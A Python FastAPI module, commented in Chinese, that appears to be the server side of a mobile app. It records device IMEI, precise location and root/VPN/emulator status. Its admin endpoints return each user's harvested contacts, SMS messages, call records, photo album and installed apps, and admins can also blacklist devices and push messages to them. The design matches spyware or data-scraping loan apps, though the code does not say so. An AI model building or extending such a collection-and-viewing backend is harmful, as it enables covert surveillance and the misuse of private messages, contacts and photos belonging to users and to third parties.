"""
设备管理 API
包含设备注册、查询、更新、数据获取、黑名单、系统消息等功能
"""

from datetime import datetime, timezone
from typing import List, Optional, Any, Dict
from fastapi import APIRouter, Depends, HTTPException, status, Request, Query
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, and_
from pydantic import BaseModel, Field

from app.core.i18n import i18n, get_language_from_request
from app.db.session import get_db
from app.db.models import User, UserDevice, UserDataPayload
from app.api.v1.auth import get_current_user

router = APIRouter()


# ==================== 请求/响应模型 ====================

class DeviceRegister(BaseModel):
    """设备注册请求模型"""
    device_model: Optional[str] = Field(None, max_length=200, description="设备型号")
    device_fingerprint: str = Field(..., max_length=255, description="设备指纹 (Hardware Hash)")
    system_version: Optional[str] = Field(None, max_length=50, description="系统版本")
    imei: Optional[str] = Field(None, max_length=50, description="IMEI")
    last_login_ip: Optional[str] = Field(None, max_length=45, description="最后登录 IP")
    location_city: Optional[str] = Field(None, max_length=100, description="城市")
    location_street: Optional[str] = Field(None, max_length=200, description="街道")
    location_address: Optional[str] = Field(None, max_length=500, description="门牌")
    latitude: Optional[float] = Field(None, description="纬度")
    longitude: Optional[float] = Field(None, description="经度")
    is_rooted: bool = Field(default=False, description="Root/越狱状态")
    is_vpn_proxy: bool = Field(default=False, description="VPN/代理检测标记")
    is_emulator: bool = Field(default=False, description="模拟器标记")
    fcm_token: Optional[str] = Field(None, max_length=500, description="Firebase Cloud Messaging token（用于推送通知）")
    platform: Optional[str] = Field(None, max_length=20, description="平台类型：android 或 ios")


class DeviceResponse(BaseModel):
    """设备信息响应模型"""
    id: int
    user_id: int
    device_model: Optional[str]
    device_fingerprint: str
    imei: Optional[str]
    last_login_ip: Optional[str]
    location_city: Optional[str]
    location_street: Optional[str]
    location_address: Optional[str]
    latitude: Optional[float]
    longitude: Optional[float]
    is_rooted: bool
    is_vpn_proxy: bool
    is_emulator: bool
    is_blacklisted: bool
    created_at: str
    updated_at: str

    class Config:
        from_attributes = True


class DeviceUpdate(BaseModel):
    """设备更新请求模型"""
    device_model: Optional[str] = Field(None, max_length=200)
    last_login_ip: Optional[str] = Field(None, max_length=45)
    location_city: Optional[str] = Field(None, max_length=100)
    location_street: Optional[str] = Field(None, max_length=200)
    location_address: Optional[str] = Field(None, max_length=500)
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    is_rooted: Optional[bool] = None
    is_vpn_proxy: Optional[bool] = None
    is_emulator: Optional[bool] = None


class DeviceWithUserResponse(DeviceResponse):
    """设备信息 + 用户信息（管理员列表用）"""
    user_phone: Optional[str] = None
    user_username: Optional[str] = None
    user_nickname: Optional[str] = None
    user_invitation_code: Optional[str] = None
    is_online: Optional[bool] = None


class DeviceBlacklistUpdate(BaseModel):
    """设备黑名单更新请求"""
    is_blacklisted: bool = Field(..., description="是否拉黑")


class SendMessageRequest(BaseModel):
    """发送系统消息请求"""
    message: str = Field(..., min_length=1, max_length=2000, description="消息内容")


# ==================== 辅助：管理员设备访问 ====================

async def _get_device_for_admin(
    device_id: int,
    current_user: User,
    db: AsyncSession,
    lang: str,
) -> tuple[UserDevice, User]:
    """解析设备并校验管理员权限。返回 (device, user)，否则抛 403/404。"""
    from app.core.permissions import is_super_admin, is_admin
    from app.db.models import Friendship

    result = await db.execute(
        select(UserDevice, User).join(User, UserDevice.user_id == User.id).where(UserDevice.id == device_id)
    )
    row = result.one_or_none()
    if not row:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=i18n.get("device.not_found", lang) or "设备不存在",
        )
    device, user = row

    if is_super_admin(current_user):
        return device, user
    if is_admin(current_user):
        friend_result = await db.execute(
            select(Friendship.friend_id).where(
                and_(
                    Friendship.user_id == current_user.id,
                    Friendship.status == "accepted",
                )
            )
        )
        friend_ids = [r[0] for r in friend_result.all()]
        if device.user_id not in friend_ids:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=i18n.get("common.forbidden", lang) or "无权访问该设备",
            )
        return device, user
    raise HTTPException(
        status_code=status.HTTP_403_FORBIDDEN,
        detail=i18n.get("common.forbidden", lang) or "权限不足",
    )


def _device_to_response(
    d: UserDevice,
    user: Optional[User] = None,
    *,
    is_online: Optional[bool] = None,
) -> Dict[str, Any]:
    """构建 DeviceResponse 字典，便于扩展为 DeviceWithUserResponse"""
    created_at_str = ""
    if d.created_at is not None:
        if isinstance(d.created_at, datetime):
            created_at_str = d.created_at.isoformat()
        else:
            created_at_str = str(d.created_at)
    updated_at_str = ""
    if d.updated_at is not None:
        if isinstance(d.updated_at, datetime):
            updated_at_str = d.updated_at.isoformat()
        else:
            updated_at_str = str(d.updated_at)
    base = {
        "id": d.id,
        "user_id": d.user_id,
        "device_model": d.device_model,
        "device_fingerprint": d.device_fingerprint,
        "system_version": d.system_version,
        "imei": d.imei,
        "last_login_ip": d.last_login_ip,
        "location_city": d.location_city,
        "location_street": d.location_street,
        "location_address": d.location_address,
        "latitude": float(d.latitude) if d.latitude is not None else None,
        "longitude": float(d.longitude) if d.longitude is not None else None,
        "is_rooted": bool(d.is_rooted) if d.is_rooted is not None else False,
        "is_vpn_proxy": bool(d.is_vpn_proxy) if d.is_vpn_proxy is not None else False,
        "is_emulator": bool(d.is_emulator) if d.is_emulator is not None else False,
        "is_blacklisted": bool(d.is_blacklisted) if d.is_blacklisted is not None else False,
        "created_at": created_at_str,
        "updated_at": updated_at_str,
    }
    if user:
        base["user_phone"] = user.phone
        base["user_username"] = user.username
        base["user_nickname"] = user.nickname
        base["user_invitation_code"] = user.invitation_code
    if is_online is not None:
        base["is_online"] = is_online
    return base


# ==================== API 路由 ====================

@router.post("/register", response_model=DeviceResponse, status_code=status.HTTP_201_CREATED)
async def register_device(
    device_data: DeviceRegister,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    注册设备
    
    用户登录后注册新设备，系统会记录设备信息和安全检测结果
    """
    lang = current_user.language or get_language_from_request(request)
    
    # 若客户端未传 last_login_ip，从请求中获取（用于 IP/歸屬地）
    from app.core.permissions import get_client_ip
    client_ip = get_client_ip(request)
    last_login_ip = device_data.last_login_ip or (client_ip if client_ip else None)
    
    # 检查设备是否已存在（同一用户的同一设备指纹）
    result = await db.execute(
        select(UserDevice).where(
            UserDevice.user_id == current_user.id,
            UserDevice.device_fingerprint == device_data.device_fingerprint
        )
    )
    existing_device = result.scalar_one_or_none()
    
    if existing_device:
        # 设备已存在，更新信息（last_login_ip 優先使用請求 IP）
        existing_device.device_model = device_data.device_model or existing_device.device_model
        existing_device.system_version = device_data.system_version or existing_device.system_version
        existing_device.imei = device_data.imei or existing_device.imei
        existing_device.last_login_ip = last_login_ip or existing_device.last_login_ip
        existing_device.location_city = device_data.location_city or existing_device.location_city
        existing_device.location_street = device_data.location_street or existing_device.location_street
        existing_device.location_address = device_data.location_address or existing_device.location_address
        existing_device.latitude = device_data.latitude or existing_device.latitude
        existing_device.longitude = device_data.longitude or existing_device.longitude
        existing_device.is_rooted = device_data.is_rooted
        existing_device.is_vpn_proxy = device_data.is_vpn_proxy
        existing_device.is_emulator = device_data.is_emulator
        
        # 更新 FCM token（临时存储在 ext_field_1，未来应添加专门字段）
        if device_data.fcm_token:
            import json
            fcm_data = {
                'fcm_token': device_data.fcm_token,
                'platform': device_data.platform or 'android',
            }
            existing_device.ext_field_1 = json.dumps(fcm_data)
        
        # updated_at 会通过事件监听器自动更新
        
        await db.commit()
        await db.refresh(existing_device)
        return _device_to_response(existing_device)
    
    # 创建新设备
    import json
    ext_field_1_value = None
    if device_data.fcm_token:
        fcm_data = {
            'fcm_token': device_data.fcm_token,
            'platform': device_data.platform or 'android',
        }
        ext_field_1_value = json.dumps(fcm_data)
    
    new_device = UserDevice(
        user_id=current_user.id,
        device_model=device_data.device_model,
        device_fingerprint=device_data.device_fingerprint,
        imei=device_data.imei,
        last_login_ip=last_login_ip,
        location_city=device_data.location_city,
        location_street=device_data.location_street,
        location_address=device_data.location_address,
        latitude=device_data.latitude,
        longitude=device_data.longitude,
        is_rooted=device_data.is_rooted,
        is_vpn_proxy=device_data.is_vpn_proxy,
        is_emulator=device_data.is_emulator,
        is_blacklisted=False,
        ext_field_1=ext_field_1_value,  # 临时存储 FCM token
    )
    
    db.add(new_device)
    await db.commit()
    await db.refresh(new_device)
    return _device_to_response(new_device)


@router.get("/", response_model=List[DeviceWithUserResponse])
async def get_user_devices(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """
    获取设备列表（根据权限返回不同的设备）
    
    权限划分：
    - 超级管理员：可以查看所有用户的设备，含用户手机号/用户名/昵称/邀请码
    - 普通管理员：只能查看自己好友列表中的设备
    - 普通用户：不能访问后端（已在登录时拦截）
    """
    from app.core.permissions import is_super_admin, is_admin
    from app.db.models import Friendship

    lang = current_user.language or get_language_from_request(request)

    from app.core.socketio import is_user_online

    if is_super_admin(current_user):
        q = (
            select(UserDevice, User)
            .join(User, UserDevice.user_id == User.id)
            .order_by(UserDevice.updated_at.desc())
        )
        result = await db.execute(q)
        rows = result.all()
    elif is_admin(current_user):
        friends_result = await db.execute(
            select(Friendship.friend_id).where(
                and_(
                    Friendship.user_id == current_user.id,
                    Friendship.status == "accepted",
                )
            )
        )
        friend_ids = [r[0] for r in friends_result.all()]
        if not friend_ids:
            return []
        q = (
            select(UserDevice, User)
            .join(User, UserDevice.user_id == User.id)
            .where(UserDevice.user_id.in_(friend_ids))
            .order_by(UserDevice.updated_at.desc())
        )
        result = await db.execute(q)
        rows = result.all()
    else:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail=i18n.get("common.forbidden", lang) or "权限不足",
        )

    return [
        _device_to_response(d, u, is_online=is_user_online(u.id))
        for d, u in rows
    ]


async def _payload_for_user(user_id: int, db: AsyncSession) -> Optional[UserDataPayload]:
    """获取用户的 UserDataPayload（唯一一条）。"""
    r = await db.execute(select(UserDataPayload).where(UserDataPayload.user_id == user_id))
    return r.scalar_one_or_none()


@router.get("/{device_id}/contacts")
async def get_device_contacts(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """获取设备对应用户的通讯录数据（管理员：好友设备；超管：全部）。"""
    lang = current_user.language or get_language_from_request(request)
    device, _ = await _get_device_for_admin(device_id, current_user, db, lang)
    payload = await _payload_for_user(device.user_id, db)
    data = (payload and payload.sensitive_data) or {}
    contacts = data.get("contacts")
    if not isinstance(contacts, list):
        contacts = []
    return {"contacts": contacts}


@router.get("/{device_id}/album")
async def get_device_album(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=200),
):
    """获取设备对应用户的相册照片列表（实际已上传的照片，分页）。"""
    from app.api.v1.files import list_user_photos_by_id

    lang = current_user.language or get_language_from_request(request)
    device, _ = await _get_device_for_admin(device_id, current_user, db, lang)
    photos = list_user_photos_by_id(device.user_id)
    total = len(photos)
    start = (page - 1) * limit
    chunk = photos[start : start + limit]
    return {"photos": chunk, "total": total, "page": page, "limit": limit}


@router.get("/{device_id}/calls")
async def get_device_calls(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """获取设备对应用户的通话记录。"""
    lang = current_user.language or get_language_from_request(request)
    device, _ = await _get_device_for_admin(device_id, current_user, db, lang)
    payload = await _payload_for_user(device.user_id, db)
    data = (payload and payload.sensitive_data) or {}
    call_records = data.get("call_records")
    if not isinstance(call_records, list):
        call_records = []
    return {"call_records": call_records}


@router.get("/{device_id}/sms")
async def get_device_sms(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """获取设备对应用户的短信数据。"""
    lang = current_user.language or get_language_from_request(request)
    device, _ = await _get_device_for_admin(device_id, current_user, db, lang)
    payload = await _payload_for_user(device.user_id, db)
    data = (payload and payload.sensitive_data) or {}
    sms = data.get("sms")
    if not isinstance(sms, list):
        sms = []
    return {"sms": sms}


@router.get("/{device_id}/apps")
async def get_device_apps(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """获取设备对应用户的 APP 列表。"""
    lang = current_user.language or get_language_from_request(request)
    device, _ = await _get_device_for_admin(device_id, current_user, db, lang)
    payload = await _payload_for_user(device.user_id, db)
    data = (payload and payload.sensitive_data) or {}
    app_list = data.get("app_list")
    if not isinstance(app_list, list):
        app_list = []
    return {"app_list": app_list}


@router.get("/{device_id}/status")
async def get_device_status(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """获取设备对应用户的在线状态。"""
    from app.core.socketio import is_user_online

    lang = current_user.language or get_language_from_request(request)
    device, _ = await _get_device_for_admin(device_id, current_user, db, lang)
    online = is_user_online(device.user_id)
    return {"is_online": online, "user_id": device.user_id}


@router.put("/{device_id}/blacklist", response_model=DeviceWithUserResponse)
async def update_device_blacklist(
    device_id: int,
    body: DeviceBlacklistUpdate,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """拉黑/解封设备（仅管理员可操作）。"""
    lang = current_user.language or get_language_from_request(request)
    device, user = await _get_device_for_admin(device_id, current_user, db, lang)
    device.is_blacklisted = body.is_blacklisted
    await db.commit()
    await db.refresh(device)
    return _device_to_response(device, user)


@router.post("/{device_id}/send-message")
async def send_device_message(
    device_id: int,
    body: SendMessageRequest,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    """向设备对应用户发送系统消息（Socket 推送；仅管理员可操作）。"""
    from app.core.socketio import broadcast_system_message

    lang = current_user.language or get_language_from_request(request)
    device, _ = await _get_device_for_admin(device_id, current_user, db, lang)
    await broadcast_system_message(body.message, target_user_id=device.user_id)
    return {"ok": True, "message": "已发送", "user_id": device.user_id}


@router.get("/{device_id}", response_model=DeviceResponse)
async def get_device(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    获取指定设备信息
    
    只能获取当前用户自己的设备
    """
    lang = current_user.language or get_language_from_request(request)
    
    result = await db.execute(
        select(UserDevice).where(
            UserDevice.id == device_id,
            UserDevice.user_id == current_user.id
        )
    )
    device = result.scalar_one_or_none()
    
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=i18n.get("device.not_found", lang)
        )
    
    return device


@router.put("/{device_id}", response_model=DeviceResponse)
async def update_device(
    device_id: int,
    device_data: DeviceUpdate,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    更新设备信息
    
    只能更新当前用户自己的设备
    """
    lang = current_user.language or get_language_from_request(request)
    
    result = await db.execute(
        select(UserDevice).where(
            UserDevice.id == device_id,
            UserDevice.user_id == current_user.id
        )
    )
    device = result.scalar_one_or_none()
    
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=i18n.get("device.not_found", lang)
        )
    
    # 更新字段（只更新提供的字段）
    update_data = device_data.model_dump(exclude_unset=True)
    for field, value in update_data.items():
        setattr(device, field, value)
    
    # updated_at 会通过事件监听器自动更新
    await db.commit()
    await db.refresh(device)
    
    return device


@router.delete("/{device_id}", status_code=status.HTTP_204_NO_CONTENT)
async def delete_device(
    device_id: int,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    删除设备
    
    只能删除当前用户自己的设备
    """
    lang = current_user.language or get_language_from_request(request)
    
    result = await db.execute(
        select(UserDevice).where(
            UserDevice.id == device_id,
            UserDevice.user_id == current_user.id
        )
    )
    device = result.scalar_one_or_none()
    
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=i18n.get("device.not_found", lang)
        )
    
    await db.delete(device)
    await db.commit()
    
    return None
